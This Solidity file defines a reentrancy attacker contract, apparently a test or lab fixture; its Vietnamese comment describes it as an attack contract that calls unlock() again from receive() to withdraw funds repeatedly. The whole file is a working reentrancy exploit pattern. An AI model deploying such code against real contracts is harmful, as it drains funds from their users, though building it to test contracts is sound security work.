// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ICd2Unlockable { function unlock() external; }

/// @title Cd2ReentrancyAttacker — hợp đồng tấn công: gọi lại unlock() trong receive() để rút nhiều lần.
contract Cd2ReentrancyAttacker {
    ICd2Unlockable public target;
    address public owner;
    uint256 public rounds;
    uint256 public maxRounds;

    constructor(address _target, uint256 _maxRounds) {
        target = ICd2Unlockable(_target);
        owner = msg.sender;
        maxRounds = _maxRounds;
    }

    function attack() external {
        require(msg.sender == owner, "owner");
        target.unlock();
    }

    receive() external payable {
        if (rounds < maxRounds) {
            rounds++;
            target.unlock();
        }
    }
}
